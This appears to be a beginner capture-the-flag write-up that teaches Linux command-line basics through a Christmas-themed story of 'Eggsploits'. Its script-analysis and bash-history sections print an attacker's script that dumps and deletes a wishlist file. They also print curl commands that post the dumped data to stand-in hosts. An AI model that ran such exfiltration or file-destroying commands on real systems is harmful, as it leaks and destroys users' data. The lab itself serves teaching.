# Linux CLI - Shells Bells

## Basic Commands
- `echo "Hello World!"` — prints text.
- `ls` — lists directory contents.
- `cat README.txt` — view file contents.

### README.txt contents
```
For all TBFC members,
Yesterday I spotted yet another Eggsploit on our servers.
Not sure what it means yet, but Wareville is in danger.
To be prepared, I'll write the security guide by tomorrow.
As a precaution, I'll also hide the guide from plain view.
~ McSkidy
```

## Navigating the Filesystem
- `pwd` — shows current directory.
- `cd Guides` — navigate to Guides directory.
- `ls -la` — shows all files including hidden.

### Hidden guide
File: `.guide.txt`
```
I think King Malhare from HopSec Island is preparing for an attack.
Not sure what his goal is, but Eggsploits on our servers are not good.
Be ready to protect Christmas by following this Linux guide:

Check /var/log/ and grep inside, let the logs become your guide.
Look for eggs that want to hide, check their shells for what's inside!
```

## Grepping Logs
- Navigate: `cd /var/log`
- Search failed logins:  
  `grep "Failed password" auth.log`
Example output:
```
2025-10-13T01:43:48 tbfc-web01: Failed password for socmas from eggbox-196.hopsec.thm
```

## Finding Files
Search for suspicious files:
- `find /home/socmas -name *egg*`
Result:
```
/home/socmas/2025/eggstrike.sh
```

## Eggstrike Script Analysis
Path: `/home/socmas/2025/eggstrike.sh`

### Script contents
```
# Eggstrike v0.3
# © 2025, Sir Carrotbane, HopSec
cat wishlist.txt | sort | uniq > /tmp/dump.txt
rm wishlist.txt && echo "Chistmas is fading..."
mv eastmas.txt wishlist.txt && echo "EASTMAS is invading!"
```

### What it does
- Extracts unique wishlist items → `/tmp/dump.txt`
- Deletes original `wishlist.txt`
- Replaces it with `eastmas.txt`

## Useful CLI Symbols
- Pipe `|` — send output between commands.
- Redirect `>` / `>>` — overwrite or append to file.
- `&&` — run next command only if previous succeeds.

## System Utilities
- `uptime`, `ip addr`, `ps aux`
- Sensitive file: `/etc/shadow` (root-only)

## Root Access
- Switch to root: `sudo su`
- Check user: `whoami`

## Bash History
- Located at:
  - `/home/mcskidy/.bash_history`
  - `/root/.bash_history`
- Example malicious entries:
```
curl --data "@/tmp/dump.txt" http://files.hopsec.thm/upload
curl --data "%qur\(tq_` :D AH?65P" http://red.hopsec.thm/report
```
